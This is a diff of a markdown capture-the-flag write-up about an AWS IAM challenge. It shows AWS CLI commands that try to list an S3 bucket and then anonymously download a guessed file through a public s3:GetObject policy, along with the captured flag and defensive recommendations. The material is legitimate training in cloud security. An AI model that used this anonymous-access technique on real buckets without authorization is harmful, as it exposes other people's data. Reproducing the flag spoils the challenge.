@@ -44,21 +44,28 @@ Furthermore, the fact that s3:GetObject has public access but that only a single
 
 Tried using the following to list the files in the S3 bucket:
 
+```
 aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ 
-
+```
 But I got an access denied error.
 
 So, I tried lsiting the files using the command below:
 
+```
 aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
+```
 
 Since s3:GetObject is unrestricted, I tried downloading a potential file name straight away and read it:
 
+```
 aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/ --no-sign-request
+```
 
 The flag obtained was:
 
+```
 {wiz:principal-arn-is-not-what-you-think}
+```
     
 ## Reflection
 My approach involved analyzing the IAM policy, identifying that listing files was restricted while object retrieval was open, and successfully downloading a file by guessing its name. The main challenge was the s3:ListBucket restriction, which made it difficult to discover available files. This was overcome by inferring likely filenames based on naming patterns. The breakthrough came from realizing that s3:GetObject was fully open despite listing restrictions. To enhance security, public access to s3:GetObject should be minimized, listing restrictions should be complemented with proper authentication, and AWS S3 Block Public Access settings should be enforced.
